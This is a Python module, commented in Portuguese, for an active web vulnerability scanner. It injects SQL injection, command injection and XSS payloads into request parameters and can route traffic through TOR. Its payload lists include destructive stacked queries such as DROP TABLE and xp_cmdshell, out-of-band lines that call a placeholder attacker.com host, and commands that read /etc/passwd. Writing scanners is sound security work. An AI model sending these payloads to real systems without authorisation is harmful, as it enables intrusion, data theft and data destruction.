"""
Módulo de Scanner Ativo de Vulnerabilidades
Este módulo testa ativamente os endpoints em busca de vulnerabilidades,
enviando payloads específicos e analisando as respostas.
"""
import requests
import os
import json
from datetime import datetime
import re
from typing import Dict, List, Any, Optional, Iterable, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .logger_config import log
from .tor_manager import TorManager
from .oast_client import OASTClient
from src.scanners.rce_oast_module import RceOastModule
from src.scanners.sqli_module import SqlInjectionModule
from src.scanners.ssti_module import SstiModule
from src.scanners.ssrf_oast_module import SsrfOastModule
from src.scanners.open_redirect_module import OpenRedirectModule
from src.scanners.header_injection_module import HeaderInjectionModule
from src.scanners.lfi_module import LfiModule
from src.scanners.xss_module import XssModule
from src.scanners.idor_module import IdorModule

class ActiveScanner:
    """
    Realiza a varredura ativa em requisições HTTP para encontrar vulnerabilidades.
    """

    def __init__(
        self,
        use_tor: bool = False,
        tor_port: int = 9050,
        oast_client: Optional[OASTClient] = None,
        enabled_modules: Optional[Union[Dict[str, bool], Iterable[str]]] = None
    ):
        self.session = requests.Session()
        self.session.verify = False
        self.use_tor = use_tor
        self.tor_port = tor_port
        self.tor_manager = None
        self.oast_client = oast_client
        self.oast_available = False
        if self.oast_client and self.oast_client.is_available():
            self.oast_available = True
        self.enabled_modules = enabled_modules
        self.scan_modules = self._load_scan_modules()
        self._logs_dir = None
        self.sql_error_patterns = [
            r"(?i)sql\s+syntax", r"(?i)mysql_fetch", r"(?i)unclosed\s+quotation\s+mark",
            r"(?i)quoted\s+string\s+not\s+properly\s+terminated", r"(?i)ora-\d{5}",
            r"(?i)postgresql.*error", r"(?i)microsoft\s+sql\s+server", r"(?i)odbc\s+driver"
        ]
        
        # Configura TOR se necessário
        if self.use_tor:
            self.tor_manager = TorManager(tor_port=self.tor_port)
            log.info(f"ActiveScanner configurado para usar TOR na porta {self.tor_port}")
        
        log.info("Scanner Ativo inicializado.")

    def _send_request(self, method, url, headers=None, data=None, timeout=10):
        """Envia requisição usando TOR se configurado."""
        if self.use_tor and self.tor_manager:
            with self.tor_manager.tor_context():
                return self.session.request(method, url, headers=headers, data=data, timeout=timeout)
        else:
            return self.session.request(method, url, headers=headers, data=data, timeout=timeout)

    def _ensure_logs_dir(self) -> str:
        if not self._logs_dir:
            base = os.path.join(os.getcwd(), 'logs', 'active_scanner')
            try:
                os.makedirs(base, exist_ok=True)
            except Exception as e:
                log.debug(f"Falha ao criar diretório de logs '{base}': {e}")
            self._logs_dir = base
        return self._logs_dir

    def _dump_request(self, method: str, url: str, headers: Dict[str, str], body: str, context_tag: str, point_name: str, payload: str):
        try:
            logs_dir = self._ensure_logs_dir()
            log_file_path = os.path.join(logs_dir, "active_scanner_requests.log")
            
            with open(log_file_path, 'a', encoding='utf-8') as f:
                f.write(f"Test: {context_tag} on parameter {point_name}\n")
                f.write(f"Body: {body}\n")
                f.write("-" * 20 + "\n")

        except Exception as e:
            log.debug(f"Não foi possível salvar request de debug: {e}")

    def _ensure_comment_space(self, payload: str) -> str:
        """Garante um único espaço após '--' (comentário SQL) e remove quaisquer caracteres após ele.
        Exemplos:
          "...--"   -> "...-- "
          "...--'"  -> "...-- "
          "...--  " -> "...-- "
        """
        try:
            if not isinstance(payload, str):
                return payload
            idx = payload.rfind('--')
            if idx == -1:
                return payload
            # Sempre normaliza para exatamente um espaço após '--' e corta o restante
            return payload[:idx + 2] + ' '
        except Exception:
            return payload

    def _should_skip_param(self, name: str) -> bool:
        if not name:
            return True
        lower = name.lower()
        skip_fragments = (
            "_token",
            "csrf",
            "xsrf",
            "authenticity",
            "viewstate",
            "eventvalidation",
            "recaptcha",
            "captcha",
            "g-recaptcha",
            "_method",
        )
        if lower.startswith("__"):
            return True
        return any(fragment in lower for fragment in skip_fragments)

    def _is_likely_path_param(self, name: str) -> bool:
        if not name:
            return False
        lower = name.lower()
        keywords = (
            "file",
            "path",
            "dir",
            "folder",
            "filename",
            "document",
            "doc",
            "include",
            "template",
            "attachment",
            "image",
            "img",
            "avatar",
            "download",
            "upload",
        )
        return any(keyword in lower for keyword in keywords)

    def _sanitize_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        sanitized = dict(headers or {})
        for key in list(sanitized.keys()):
            if key.lower() in ("content-length", "proxy-connection"):
                sanitized.pop(key, None)
        return sanitized

    def _get_insertion_points(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        points = []
        parsed_url = urlparse(request['url'])
        query_params = parse_qs(parsed_url.query)
        for name, values in query_params.items():
            for value in values:
                if not self._should_skip_param(name):
                    points.append({'type': 'url', 'name': name, 'value': value})
        headers = {k.lower(): v for k, v in request.get('headers', {}).items()}
        if 'content-type' in headers and 'application/x-www-form-urlencoded' in headers['content-type']:
            if request.get('body'):
                body_params = parse_qs(request['body'])
                for name, values in body_params.items():
                    for value in values:
                        if not self._should_skip_param(name):
                            points.append({'type': 'body', 'name': name, 'value': value})
        log.debug(f"Pontos de inserção encontrados: {len(points)}")
        return points

    def _load_scan_modules(self) -> List[Any]:
        modules = []
        enabled = self.enabled_modules
        enabled_set = None
        enabled_map = None
        if isinstance(enabled, dict):
            enabled_map = {str(k): bool(v) for k, v in enabled.items()}
        elif enabled is not None:
            enabled_set = {str(k) for k in enabled}
        for module_cls in (
            SqlInjectionModule,
            RceOastModule,
            SstiModule,
            SsrfOastModule,
            OpenRedirectModule,
            HeaderInjectionModule,
            LfiModule,
            XssModule,
            IdorModule,
        ):
            try:
                name = module_cls.__name__
                if name in ("RceOastModule", "SsrfOastModule") and not self.oast_available:
                    continue
                if enabled_map is not None and not enabled_map.get(name, False):
                    continue
                if enabled_set is not None and name not in enabled_set:
                    continue
                modules.append(module_cls())
            except Exception as e:
                log.debug(f"Falha ao carregar modulo {module_cls.__name__}: {e}")
        return modules

    def _build_request_node_for_modules(self, base_request: Dict[str, Any]) -> Dict[str, Any]:
        headers = base_request.get('headers', {}) or {}
        normalized_headers = dict(headers)
        for key, value in headers.items():
            lower = key.lower()
            if lower == 'cookie' and key != 'Cookie':
                normalized_headers['Cookie'] = value
            if lower == 'content-type' and key != 'Content-Type':
                normalized_headers['Content-Type'] = value
        body = base_request.get('body', '') or ''
        if isinstance(body, str):
            body_blob = body.encode('utf-8', errors='ignore')
        else:
            body_blob = body or b''
        return {
            'id': base_request.get('id') or 0,
            'method': base_request.get('method'),
            'url': base_request.get('url'),
            'headers': json.dumps(normalized_headers),
            'request_body_blob': body_blob,
        }

    def _iter_json_points(self, data: Any, parent_key: str = "") -> List[Dict[str, str]]:
        points = []
        if isinstance(data, dict):
            for key, value in data.items():
                new_key = f"{parent_key}.{key}" if parent_key else key
                if isinstance(value, (dict, list)):
                    points.extend(self._iter_json_points(value, new_key))
                else:
                    points.append({'name': new_key, 'value': str(value)})
        elif isinstance(data, list):
            for i, item in enumerate(data):
                new_key = f"{parent_key}[{i}]"
                if isinstance(item, (dict, list)):
                    points.extend(self._iter_json_points(item, new_key))
                else:
                    points.append({'name': new_key, 'value': str(item)})
        return points

    def _derive_injection_points_for_modules(self, base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        points: List[Dict[str, Any]] = []
        point_id = 1

        url = base_request.get('url', '')
        headers = base_request.get('headers', {}) or {}
        body = base_request.get('body', '') or ''

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query, keep_blank_values=True)
        for name, values in query_params.items():
            for value in values:
                points.append({
                    'id': point_id,
                    'location': 'QUERY',
                    'parameter_name': name,
                    'original_value': value,
                })
                point_id += 1

        content_type = ''
        for key, value in headers.items():
            if key.lower() == 'content-type':
                content_type = value
                break

        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore')
        else:
            body_text = body

        if 'application/x-www-form-urlencoded' in (content_type or '') and body_text:
            form_params = parse_qs(body_text, keep_blank_values=True)
            for name, values in form_params.items():
                for value in values:
                    points.append({
                        'id': point_id,
                        'location': 'BODY_FORM',
                        'parameter_name': name,
                        'original_value': value,
                    })
                    point_id += 1

        if 'application/json' in (content_type or '') and body_text:
            try:
                json_body = json.loads(body_text)
                for item in self._iter_json_points(json_body):
                    points.append({
                        'id': point_id,
                        'location': 'BODY_JSON',
                        'parameter_name': item['name'],
                        'original_value': item['value'],
                    })
                    point_id += 1
            except Exception:
                pass

        exclude_headers = {
            'content-length', 'host', 'connection', 'accept', 'accept-encoding',
            'accept-language', 'user-agent', 'cache-control', 'pragma'
        }
        for name, value in headers.items():
            if name.lower() in exclude_headers:
                continue
            points.append({
                'id': point_id,
                'location': 'HEADER',
                'parameter_name': name,
                'original_value': value,
            })
            point_id += 1

        cookie_header = None
        for name, value in headers.items():
            if name.lower() == 'cookie':
                cookie_header = value
                break
        if cookie_header:
            cookie_parts = [c.strip() for c in cookie_header.split(';') if '=' in c]
            for part in cookie_parts:
                key, value = part.split('=', 1)
                points.append({
                    'id': point_id,
                    'location': 'COOKIE',
                    'parameter_name': key.strip(),
                    'original_value': value.strip(),
                })
                point_id += 1

        return points

    def _module_vuln_to_dict(self, vuln: Any, base_request: Dict[str, Any]) -> Dict[str, Any]:
        evidence = vuln.evidence
        if isinstance(evidence, (dict, list)):
            evidence_text = json.dumps(evidence, ensure_ascii=True, default=str)
        else:
            evidence_text = str(evidence)
        return {
            'type': vuln.name,
            'severity': vuln.severity,
            'source': 'Module',
            'url': base_request.get('url', 'N/A'),
            'method': base_request.get('method', 'N/A'),
            'description': vuln.description,
            'evidence': evidence_text,
        }

    def _run_scan_modules(self, base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        if not self.scan_modules:
            return []
        request_node = self._build_request_node_for_modules(base_request)
        injection_points = self._derive_injection_points_for_modules(base_request)
        results: List[Dict[str, Any]] = []

        for point in injection_points:
            for module in self.scan_modules:
                try:
                    log.info(f"ScanAtivo - {module.__class__.__name__} (param: {point.get('parameter_name')})")
                    vulns = module.run_test(request_node, point, self.oast_client)
                    for vuln in vulns:
                        results.append(self._module_vuln_to_dict(vuln, base_request))
                except Exception as e:
                    log.debug(f"Falha no modulo {module.__class__.__name__}: {e}")
                    continue

        return results

    def _send_modified_request(self, original_request: Dict, insertion_point: Dict, payload: str, context_tag: str = None) -> requests.Response:
        """Envia uma requisição modificada, com suporte a TOR."""
        try:
            # Conecta ao TOR se necessário
            if self.use_tor and self.tor_manager:
                if not self.tor_manager.connect():
                    log.error("Falha ao conectar com TOR para requisição modificada")
            
            method = original_request['method']
            url = original_request['url']
            headers = self._sanitize_headers(original_request.get('headers', {}))
            body = original_request.get('body', '')
            parsed_url = urlparse(url)
            
            # Ajuste fino do payload (espaço e corte após '-- ') somente para contextos de SQLi
            if context_tag and isinstance(context_tag, str) and context_tag.startswith('sqli'):
                payload = self._ensure_comment_space(payload)

            if insertion_point['type'] == 'url':
                query_params = parse_qs(parsed_url.query, keep_blank_values=True)
                query_params[insertion_point['name']] = [payload]
                new_query = urlencode(query_params, doseq=True)
                url_parts = list(parsed_url)
                url_parts[4] = new_query
                new_url = urlunparse(url_parts)
                self._dump_request(method, new_url, headers, body if isinstance(body, str) else (body or b'').decode('utf-8', errors='replace'), context_tag, insertion_point.get('name'), payload)
                response = self._send_request(method, new_url, headers=headers, data=body.encode('utf-8'), timeout=10)
                
            elif insertion_point['type'] == 'body':
                body_params = parse_qs(body, keep_blank_values=True)
                body_params[insertion_point['name']] = [payload]

                # Recria o corpo form-urlencoded e garante Content-Type correto
                new_body_str = urlencode(body_params, doseq=True)

                # Mantém os headers originais, removendo apenas Content-Length (requests calcula automaticamente)
                new_headers = dict(headers)

                # Garante que o Content-Type permaneça como application/x-www-form-urlencoded
                has_ct = any(k.lower() == 'content-type' for k in new_headers.keys())
                if not has_ct:
                    new_headers['Content-Type'] = 'application/x-www-form-urlencoded'

                # Log opcional de debug
                log.debug(f"--- SCANNER DEBUG: Enviando body modificado: {new_body_str}")

                self._dump_request(method, url, new_headers, new_body_str, context_tag, insertion_point.get('name'), payload)

                response = self._send_request(
                    method,
                    url,
                    headers=new_headers,
                    data=new_body_str,
                    timeout=10,
                )

            # Fallback para outros tipos ou se não for url/body
            else:
                self._dump_request(method, url, headers, body if isinstance(body, str) else (body or b'').decode('utf-8', errors='replace'), context_tag, insertion_point.get('name'), payload)
                response = self._send_request(method, url, headers=headers, data=body.encode('utf-8'), timeout=10)
            
            return response
            
        finally:
            # Sempre desconecta o TOR após a requisição
            if self.use_tor and self.tor_manager:
                self.tor_manager.disconnect()

    def _check_sql_injection(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        # Inclui comentário com espaço após -- para encerrar a instrução corretamente em muitos SGBDs
        sqli_payloads = [
            # Basic error-based
            "'",
            '"',
            "`",
            "';",
            '";',
            "`",
            "',",
            '",',
            
            # OR-based injections
            "' OR '1'='1'-- ",
            '" OR "1"="1"-- ',
            "' OR '1'='1'/* ",
            '" OR "1"="1"/* ',
            "' OR 1=1-- ",
            '" OR 1=1-- ',
            "' OR 'a'='a'-- ",
            '" OR "a"="a"-- ',
            "') OR ('1'='1'-- ",
            '") OR ("1"="1"-- ',
            "') OR '1'='1'-- ",
            '") OR "1"="1"-- ',
            
            # AND-based injections
            "' AND '1'='1'-- ",
            "' AND '1'='2'-- ",
            "' AND 1=1-- ",
            "' AND 1=2-- ",
            
            # UNION-based injections
            "' UNION SELECT NULL-- ",
            "' UNION SELECT NULL,NULL-- ",
            "' UNION SELECT NULL,NULL,NULL-- ",
            "' UNION SELECT NULL,NULL,NULL,NULL-- ",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ",
            "' UNION ALL SELECT NULL-- ",
            "' UNION ALL SELECT NULL,NULL-- ",
            "' UNION ALL SELECT NULL,NULL,NULL-- ",
            "' UNION SELECT @@version,NULL-- ",
            "' UNION SELECT user(),database()-- ",
            "' UNION SELECT table_name,NULL FROM information_schema.tables-- ",
            "' UNION SELECT column_name,NULL FROM information_schema.columns-- ",
            
            # Stacked queries
            "'; DROP TABLE users-- ",
            "'; DELETE FROM users-- ",
            "'; INSERT INTO users VALUES('hacker','pass')-- ",
            "'; EXEC xp_cmdshell('dir')-- ",
            
            # Time-based blind (já tem método separado, mas incluindo alguns aqui)
            "' OR SLEEP(5)-- ",
            "'; WAITFOR DELAY '0:0:5'-- ",
            "' AND SLEEP(5)-- ",
            "' OR BENCHMARK(5000000,MD5('A'))-- ",
            
            # Boolean-based blind
            "' AND 1=1-- ",
            "' AND 1=2-- ",
            "' AND SUBSTRING(version(),1,1)='5'-- ",
            
            # Authentication bypass
            "admin'-- ",
            "admin' OR '1'='1'-- ",
            "admin' OR 1=1-- ",
            "admin' OR '1'='1'/* ",
            "admin') OR ('1'='1'-- ",
            "admin') OR '1'='1'/* ",
            "' OR 'x'='x'-- ",
            "') OR ('x'='x'-- ",
            "' OR username IS NOT NULL-- ",
            "' OR 1=1 LIMIT 1-- ",
            
            # Comment variations
            "' OR '1'='1'# ",
            "' OR '1'='1'/* ",
            "' OR '1'='1';-- ",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Database-specific injections
            # MySQL
            "' OR '1'='1' LIMIT 1-- ",
            "' UNION SELECT NULL,NULL,@@version-- ",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
            
            # PostgreSQL
            "' OR '1'='1'-- ",
            "'; SELECT pg_sleep(5)-- ",
            "' AND 1::int=1-- ",
            
            # MSSQL
            "' OR '1'='1'-- ",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')-- ",
            "' AND 1=CONVERT(int,'1')-- ",
            
            # Oracle
            "' OR '1'='1'-- ",
            "' UNION SELECT NULL,NULL FROM dual-- ",
            "' AND 1=1-- ",
            
            # SQLite
            "' OR '1'='1'-- ",
            "' UNION SELECT NULL,sqlite_version()-- ",
            
            # Out-of-band (DNS/HTTP exfiltration)
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- ",
            "' UNION SELECT LOAD_FILE('\\\\\\attacker.com\\\\share')-- ",
            
            # Second-order injections
            "admin'-- ",
            "admin' AND '1'='1'-- ",
            
            # WAF bypass techniques
            "' /*!50000OR*/ '1'='1'-- ",
            "' %26%26 '1'='1'-- ",
            "' || '1'='1'-- ",
            "' && '1'='1'-- ",
            "' UnIoN SeLeCt NULL-- ",
            "' uNiOn sElEcT NULL-- ",
            "' /*!UNION*/ /*!SELECT*/ NULL-- ",
            "' /**/UNION/**/SELECT/**/NULL-- ",
            "' UNION/**/SELECT/**/NULL-- ",
            "'+OR+'1'='1'-- ",
            "' OR '1'='1' --+ ",
            
            # Encoded payloads
            "%27%20OR%20%271%27=%271",
            "%27%20UNION%20SELECT%20NULL--",
            
            # Polyglot payloads
            "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
        ]
        for payload in sqli_payloads:
            try:
                response = self._send_modified_request(base_request, point, payload, context_tag=f"sqli-error:{payload}")
                for pattern in self.sql_error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = {
                            'type': 'SQL Injection (Error-Based)',
                            'severity': 'High',
                            'source': 'Active',
                            'url': base_request['url'],
                            'method': base_request['method'],
                            'description': f"Possível SQL Injection detectado no parâmetro '{point['name']}' com o payload '{payload}'.",
                            'evidence': f"Payload: {payload} | Match: {re.search(pattern, response.text, re.IGNORECASE).group(0)}",
                        }
                        vulnerabilities.append(vuln)
                        log.warning(f"SQL Injection detectado em {base_request['url']} no parâmetro {point['name']}")
                        return vulnerabilities
            except requests.exceptions.RequestException as e:
                log.error(f"Erro no teste de SQLi para {base_request['url']}: {e}")
        return vulnerabilities

    def _check_boolean_sqli(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        try:
            original_response = self._send_modified_request(base_request, point, point['value'], context_tag="sqli-bool:base")
            original_len = len(original_response.text)
            # Comenta o restante para evitar quebra por sintaxe a jusante
            true_payload = "' AND '1'='1'-- "
            true_response = self._send_modified_request(base_request, point, true_payload, context_tag="sqli-bool:true")
            true_len = len(true_response.text)
            false_payload = "' AND '1'='2'-- "
            false_response = self._send_modified_request(base_request, point, false_payload, context_tag="sqli-bool:false")
            false_len = len(false_response.text)
            true_diff = abs(original_len - true_len)
            false_diff = abs(original_len - false_len)
            threshold = max(100, original_len * 0.1)
            if true_diff < threshold and false_diff > threshold:
                vuln = {
                    'type': 'SQL Injection (Boolean-Based)',
                    'severity': 'High',
                    'source': 'Active',
                    'url': base_request['url'],
                    'method': base_request['method'],
                    'description': f"SQL Injection Boolean-Based detectado no parâmetro '{point['name']}'. "
                                   f"Respostas TRUE e FALSE diferem significativamente.",
                    'evidence': f"Payloads: TRUE='{true_payload}' FALSE='{false_payload}' | Original: {original_len} bytes, TRUE: {true_len} bytes, FALSE: {false_len} bytes",
                }
                vulnerabilities.append(vuln)
                log.warning(f"Boolean-Based SQL Injection detectado em {base_request['url']} no parâmetro {point['name']}")
        except requests.exceptions.RequestException as e:
            log.error(f"Erro no teste de Boolean SQLi para {base_request['url']}: {e}")
        return vulnerabilities

    def _check_time_based_sqli(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        # Garante espaço após -- para efetivar o comentário
        time_payloads = [
            ("' OR SLEEP(5)-- ", "MySQL"),
            ("'; WAITFOR DELAY '0:0:5'-- ", "MSSQL"),
            ("'||pg_sleep(5)-- ", "PostgreSQL"),
        ]
        try:
            import time
            start = time.time()
            self._send_modified_request(base_request, point, point['value'], context_tag="sqli-time:base")
            normal_time = time.time() - start
            for payload, db_type in time_payloads:
                try:
                    start = time.time()
                    self._send_modified_request(base_request, point, payload, context_tag=f"sqli-time:{db_type}")
                    delay_time = time.time() - start
                    if delay_time - normal_time >= 4:
                        vuln = {
                            'type': 'SQL Injection (Time-Based)',
                            'severity': 'High',
                            'source': 'Active',
                            'url': base_request['url'],
                            'method': base_request['method'],
                            'description': f"SQL Injection Time-Based detectado no parâmetro '{point['name']}'. "
                                           f"Possível banco de dados: {db_type}",
                            'evidence': f"Payload: {payload} | Delay: {delay_time - normal_time:.2f}s",
                        }
                        vulnerabilities.append(vuln)
                        log.warning(f"Time-Based SQL Injection ({db_type}) detectado em {base_request['url']} no parâmetro {point['name']}")
                        return vulnerabilities
                except requests.exceptions.RequestException as e:
                    log.debug(f"Erro no teste time-based para {db_type}: {e}")
        except requests.exceptions.RequestException as e:
            log.error(f"Erro no teste de Time-Based SQLi para {base_request['url']}: {e}")
        return vulnerabilities

    def _check_command_injection(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        # Payloads de Command Injection expandidos
        cmd_payloads = [
            # Time-based detection - Unix/Linux
            ("; sleep 5", "Unix/Linux", True),
            ("| sleep 5", "Unix/Linux", True),
            ("& sleep 5", "Unix/Linux", True),
            ("&& sleep 5", "Unix/Linux", True),
            ("|| sleep 5", "Unix/Linux", True),
            ("`sleep 5`", "Unix/Linux", True),
            ("$(sleep 5)", "Unix/Linux", True),
            
            # Time-based detection - Windows
            ("& timeout /t 5", "Windows", True),
            ("&& timeout /t 5", "Windows", True),
            ("| timeout /t 5", "Windows", True),
            ("|| timeout /t 5", "Windows", True),
            ("; timeout /t 5", "Windows", True),
            ("& ping -n 6 127.0.0.1", "Windows", True),
            ("| ping -n 6 127.0.0.1", "Windows", True),
            
            # Output-based detection - Unix/Linux
            ("; whoami", "Unix/Linux", False),
            ("| whoami", "Unix/Linux", False),
            ("& whoami", "Unix/Linux", False),
            ("&& whoami", "Unix/Linux", False),
            ("`whoami`", "Unix/Linux", False),
            ("$(whoami)", "Unix/Linux", False),
            ("; id", "Unix/Linux", False),
            ("| id", "Unix/Linux", False),
            ("&& id", "Unix/Linux", False),
            ("`id`", "Unix/Linux", False),
            ("$(id)", "Unix/Linux", False),
            ("; uname -a", "Unix/Linux", False),
            ("| uname -a", "Unix/Linux", False),
            ("; cat /etc/passwd", "Unix/Linux", False),
            ("| cat /etc/passwd", "Unix/Linux", False),
            ("; ls -la", "Unix/Linux", False),
            ("| ls -la", "Unix/Linux", False),
            
            # Output-based detection - Windows
            ("& whoami", "Windows", False),
            ("&& whoami", "Windows", False),
            ("| whoami", "Windows", False),
            ("|| whoami", "Windows", False),
            ("; whoami", "Windows", False),
            ("& dir", "Windows", False),
            ("| dir", "Windows", False),
            ("&& dir", "Windows", False),
            ("& type C:\\windows\\win.ini", "Windows", False),
            ("| type C:\\windows\\win.ini", "Windows", False),
            ("& ipconfig", "Windows", False),
            ("| ipconfig", "Windows", False),
            
            # Encoded/obfuscated - Unix
            (";s''leep 5", "Unix/Linux", True),
            (";s\\leep 5", "Unix/Linux", True),
            (";sl'e'ep 5", "Unix/Linux", True),
            
            # Newline injection
            ("%0a sleep 5", "Unix/Linux", True),
            ("%0d sleep 5", "Unix/Linux", True),
            ("\n sleep 5", "Unix/Linux", True),
            ("\r sleep 5", "Unix/Linux", True),
            
            # Without spaces
            (";sleep${IFS}5", "Unix/Linux", True),
            ("|sleep${IFS}5", "Unix/Linux", True),
            (";cat${IFS}/etc/passwd", "Unix/Linux", False),
            
            # Backticks and command substitution
            ("`whoami`", "Unix/Linux", False),
            ("$(whoami)", "Unix/Linux", False),
            ("`id`", "Unix/Linux", False),
            ("$(id)", "Unix/Linux", False),
            
            # Pipe variations
            ("|| whoami", "Unix/Linux", False),
            ("| whoami #", "Unix/Linux", False),
            ("| whoami //", "Unix/Linux", False),
        ]
        
        # Padrões que indicam sucesso da injeção de comando
        success_patterns = [
            r"uid=\d+",
            r"gid=\d+",
            r"root|daemon|www-data|nobody",
            r"Linux|GNU",
            r"Windows|Microsoft",
            r"\[boot loader\]",
            r"for 16-bit app support",
            r"Directory of",
            r"Volume Serial Number",
        ]
        
        try:
            for payload, os_type, is_time_based in cmd_payloads:
                try:
                    # Testa o payload direto (sem concatenar com o valor original)
                    if is_time_based:
                        import time
                        start = time.time()
                        self._send_modified_request(base_request, point, payload, context_tag=f"cmdinj-time:{os_type}")
                        delay = time.time() - start
                        if delay >= 4:
                            vuln = {
                                'type': 'Command Injection (Time-Based)',
                                'severity': 'Critical',
                                'source': 'Active',
                                'url': base_request['url'],
                                'method': base_request['method'],
                                'description': f"Command Injection detectado no parâmetro '{point['name']}'. "
                                               f"Sistema operacional: {os_type}",
                                'evidence': f"Payload: {payload} | Delay: {delay:.2f}s",
                            }
                            vulnerabilities.append(vuln)
                            log.critical(f"Command Injection detectado em {base_request['url']} no parâmetro {point['name']}")
                            return vulnerabilities
                    else:
                        response = self._send_modified_request(base_request, point, payload, context_tag=f"cmdinj-output:{os_type}")
                        for pattern in success_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'Command Injection',
                                    'severity': 'Critical',
                                    'source': 'Active',
                                    'url': base_request['url'],
                                    'method': base_request['method'],
                                    'description': f"Command Injection detectado no parâmetro '{point['name']}'. "
                                                   f"Sistema operacional: {os_type}",
                                    'evidence': f"Payload: {payload} | Match: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:200]}",
                                }
                                vulnerabilities.append(vuln)
                                log.critical(f"Command Injection detectado em {base_request['url']} no parâmetro {point['name']}")
                                return vulnerabilities
                except requests.exceptions.RequestException as e:
                    log.debug(f"Erro no teste de command injection: {e}")
        except Exception as e:
            log.error(f"Erro no teste de Command Injection para {base_request['url']}: {e}")
        return vulnerabilities

    def _check_xss(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        # Payloads XSS expandidos com bypass de filtros e variações
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            
            # IMG tag variations
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src='x' onerror='alert(1)'>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<img/src=x onerror=alert(1)>",
            "<img src=x:alert(1) onerror=eval(src)>",
            
            # SVG-based XSS
            "<svg/onload=alert('XSS')>",
            "<svg/onload=alert(1)>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert(1)>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "jAvAsCrIpT:alert(1)",
            
            # Data URI
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            
            # Filter bypass - Case variations
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<sCrIpT>alert(1)</sCrIpT>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            # Filter bypass - Null bytes
            "<script\x00>alert('XSS')</script>",
            
            # Filter bypass - Encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            
            # Filter bypass - Comments
            "<scr<!---->ipt>alert('XSS')</scr<!---->ipt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # Filter bypass - Spaces and tabs
            "<script\n>alert('XSS')</script>",
            "<script\r>alert('XSS')</script>",
            "<script\t>alert('XSS')</script>",
            "<img/src=x\nonerror=alert(1)>",
            
            # Filter bypass - Without quotes
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            
            # Filter bypass - Without parentheses
            "<script>onerror=alert;throw 1</script>",
            "<script>{onerror=alert}throw 1</script>",
            
            # Filter bypass - Without 'script'
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            
            # DOM-based XSS
            "<iframe src=# onload=alert(1)>",
            "<form action=javascript:alert(1)><input type=submit>",
            "<isindex action=javascript:alert(1) type=submit>",
            
            # Polyglot XSS
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"><img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            
            # WAF bypass
            "<svg%0Aonload%0D=%0Aalert(1)>",
            "<img%09src=x%09onerror=alert(1)>",
            "<img%0Asrc=x%0Aonerror=alert(1)>",
            "<img%0Dsrc=x%0Donerror=alert(1)>",
            
            # AngularJS-based (if AngularJS is used)
            "{{constructor.constructor('alert(1)')()}}",
            "{{alert(1)}}",
            "{{$eval.constructor('alert(1)')()}}",
            
            # VBScript (IE only, but still worth testing)
            "<script language=vbscript>alert('XSS')</script>",
            
            # Identifier for scanning
            "activescanner<xss>test",
            "<activescanner>xsstest</activescanner>",
        ]
        
        try:
            for xss_payload in xss_payloads:
                try:
                    response = self._send_modified_request(base_request, point, xss_payload, context_tag=f"xss:{xss_payload[:20]}")
                    
                    # Verifica se o payload foi refletido na resposta
                    if xss_payload in response.text:
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'source': 'Active',
                            'url': base_request['url'],
                            'method': base_request['method'],
                            'description': f"Payload de XSS refletido no parâmetro '{point['name']}'.",
                            'evidence': xss_payload[:200],  # Limita o tamanho da evidência
                        }
                        vulnerabilities.append(vuln)
                        log.warning(f"XSS Refletido detectado em {base_request['url']} no parâmetro {point['name']} com payload: {xss_payload[:50]}")
